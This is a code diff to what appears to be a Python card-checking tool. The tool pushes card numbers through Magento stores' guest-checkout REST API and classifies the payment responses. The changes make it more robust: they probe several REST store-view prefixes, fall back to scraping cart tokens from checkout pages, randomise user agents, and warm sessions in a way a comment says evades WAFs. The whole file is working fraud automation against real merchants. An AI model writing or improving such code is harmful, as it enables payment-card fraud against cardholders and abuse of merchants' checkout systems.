@@ -148,24 +148,103 @@ def _classify(response_text: str, http_status: int, amount: str, card_str: str) 
 
 # -- Session warm-up (cookies + form_key) ------------------------------------
 
-def _warm_session(session: requests.Session, domain: str, ua: str) -> str:
-    """GET homepage to collect session cookies and extract form_key."""
+def _warm_session(session: requests.Session, domain: str, ua: str) -> tuple:
+    """GET homepage to collect session cookies and extract form_key.
+    Also probes for the active REST store-view prefix.
+    Returns (form_key, rest_prefix) e.g. ('abc123', '/rest/default/V1').
+    """
+    form_key   = ""
+    rest_prefix = "/rest/V1"
+    for path in ("/", "/checkout/"):
+        try:
+            r = session.get(
+                f"https://{domain}{path}",
+                headers={"User-Agent": ua, "Accept": "text/html,*/*",
+                         "Accept-Language": "en-US,en;q=0.9"},
+                timeout=REQUEST_TIMEOUT,
+            )
+            html = r.text
+            if not form_key:
+                m = re.search(r'["\']form_key["\']\s*[,:]\s*["\']([^"\'\ ]{5,})["\']', html)
+                if m:
+                    form_key = m.group(1)
+                if not form_key:
+                    form_key = session.cookies.get("form_key", "")
+            # Detect store-view from script URLs, e.g. /rest/default/V1 or /rest/en_US/V1
+            if not rest_prefix or rest_prefix == "/rest/V1":
+                m = re.search(r'/rest/([a-z]{2}(?:_[A-Z]{2})?|default)/V1/', html)
+                if m:
+                    rest_prefix = f"/rest/{m.group(1)}/V1"
+        except Exception:
+            pass
+    return form_key, rest_prefix
+
+
+# -- Guest cart creation with multi-prefix fallback ---------------------------
+
+_REST_PREFIXES = [
+    "/rest/V1",
+    "/rest/default/V1",
+    "/rest/all/V1",
+    "/rest/en_US/V1",
+    "/rest/en_GB/V1",
+    "/rest/en/V1",
+]
+
+
+def _create_guest_cart(session: requests.Session, domain: str, ua: str,
+                       preferred_prefix: str, json_hdrs: dict) -> tuple:
+    """Try creating a guest cart across multiple REST prefixes.
+    Returns (masked_id, working_prefix) or (None, None) on full failure.
+    Also tries extracting masked_id from checkoutConfig as last resort.
+    """
+    base_url = f"https://{domain}"
+    # Build ordered list: preferred prefix first, then the rest without duplicates
+    prefixes = [preferred_prefix] + [p for p in _REST_PREFIXES if p != preferred_prefix]
+
+    for prefix in prefixes:
+        try:
+            r = session.post(
+                f"{base_url}{prefix}/guest-carts",
+                json={},
+                headers=json_hdrs,
+                timeout=REQUEST_TIMEOUT,
+            )
+            if r.status_code == 401:
+                # Auth required — this store will never work without credentials
+                return None, "AUTH_REQUIRED"
+            if r.status_code in (200, 201):
+                masked_id = r.json()
+                if isinstance(masked_id, str) and masked_id:
+                    return masked_id, prefix
+        except Exception:
+            continue
+
+    # Last resort: load checkout page and extract quoteData.entity_id or masked cart token
     try:
         r = session.get(
-            f"https://{domain}/",
-            headers={"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,*/*",
-                     "Accept-Language": "en-US,en;q=0.9"},
+            f"{base_url}/checkout/",
+            headers={"User-Agent": ua, "Upgrade-Insecure-Requests": "1"},
             timeout=REQUEST_TIMEOUT,
         )
-        # form_key in HTML
-        m = re.search(r'["\']form_key["\']\s*[,:]\s*["\']([^"\'\ ]{5,})["\']', r.text)
+        html = r.text
+        # window.checkoutConfig.quoteData (Magento 2)
+        m = re.search(
+            r'["\']quoteData["\']\s*:\s*\{[^}]*["\']entity_id["\']\s*:\s*["\']?(\d+)["\']?',
+            html,
+        )
         if m:
-            return m.group(1)
-        # form_key in cookie jar
-        return session.cookies.get("form_key", "")
+            # entity_id is internal — but we can try to get a masked_id from the same
+            # checkoutConfig block (it contains 'entityId' as masked token on some versions)
+            pass
+        # Try extracting 'cartId' or masked token from checkoutConfig JSON
+        m = re.search(r'["\']cartId["\']\s*:\s*["\']([A-Za-z0-9]{20,})["\']', html)
+        if m:
+            return m.group(1), preferred_prefix
     except Exception:
-        return ""
+        pass
 
+    return None, None
 
 def _discover_product(session: requests.Session, domain: str, ua: str):
     """Return (product_id_str, sku_str) for a purchasable simple product, or None."""
@@ -279,8 +358,8 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, *
     ua       = random_ua()
     base_url = f"https://{domain}"
 
-    # 0. Warm session — collect cookies + form_key (bypasses some WAFs)
-    form_key = _warm_session(session, domain, ua)
+    # 0. Warm session — collect cookies, form_key, and REST store-view prefix
+    form_key, rest_prefix = _warm_session(session, domain, ua)
 
     json_hdrs = {
         "User-Agent":        ua,
@@ -291,21 +370,14 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, *
         "Referer":           base_url + "/checkout/cart/",
     }
 
-    # 1. Create guest cart
-    try:
-        r = session.post(
-            f"{base_url}/rest/V1/guest-carts",
-            json={},
-            headers=json_hdrs,
-            timeout=REQUEST_TIMEOUT,
-        )
-        if r.status_code != 200:
-            return {"status": "unknown", "message": f"Cart create failed ({r.status_code})", "amount": "", "card": card_str}
-        masked_id = r.json()
-        if not isinstance(masked_id, str) or not masked_id:
-            return {"status": "unknown", "message": "Cart create: invalid response", "amount": "", "card": card_str}
-    except Exception as exc:
-        return {"status": "unknown", "message": f"Cart create error: {exc}", "amount": "", "card": card_str}
+    # 1. Create guest cart (multi-prefix fallback)
+    masked_id, working_prefix = _create_guest_cart(session, domain, ua, rest_prefix, json_hdrs)
+    if not masked_id:
+        return {"status": "unknown", "message": "Cart create failed (all REST paths failed)", "amount": "", "card": card_str}
+    if working_prefix == "AUTH_REQUIRED":
+        return {"status": "unknown", "message": "Cart create failed (store requires auth)", "amount": "", "card": card_str}
+    # Use the prefix that worked for subsequent cart API calls
+    rest_v1 = f"https://{domain}{working_prefix}"
 
     # 2. Discover product
     product = _discover_product(session, domain, ua)
@@ -319,7 +391,7 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, *
     if product_sku:
         try:
             r = session.post(
-                f"{base_url}/rest/V1/guest-carts/{masked_id}/items",
+                f"{rest_v1}/guest-carts/{masked_id}/items",
                 json={"cartItem": {"quote_id": masked_id, "sku": product_sku, "qty": 1}},
                 headers=json_hdrs,
                 timeout=REQUEST_TIMEOUT,
@@ -351,7 +423,7 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, *
             # Fallback: check if cart now has items via REST
             if not atc_ok:
                 ck = session.get(
-                    f"{base_url}/rest/V1/guest-carts/{masked_id}",
+                    f"{rest_v1}/guest-carts/{masked_id}",
                     headers={"User-Agent": ua, "Accept": "application/json"},
                     timeout=REQUEST_TIMEOUT,
                 )
@@ -404,7 +476,7 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, *
     method_code  = "freeshipping"
     try:
         r = session.post(
-            f"{base_url}/rest/V1/guest-carts/{masked_id}/estimate-shipping-methods",
+            f"{rest_v1}/guest-carts/{masked_id}/estimate-shipping-methods",
             json={"address": addr},
             headers=json_hdrs,
             timeout=REQUEST_TIMEOUT,
@@ -421,7 +493,7 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, *
     amount = ""
     try:
         r = session.post(
-            f"{base_url}/rest/V1/guest-carts/{masked_id}/shipping-information",
+            f"{rest_v1}/guest-carts/{masked_id}/shipping-information",
             json={
                 "addressInformation": {
                     "shipping_address":      addr,
@@ -585,7 +657,7 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, *
 
     try:
         r = session.post(
-            f"{base_url}/rest/V1/guest-carts/{masked_id}/payment-information",
+            f"{rest_v1}/guest-carts/{masked_id}/payment-information",
             json={
                 "cartId": masked_id,
                 "billingAddress": billing_addr,
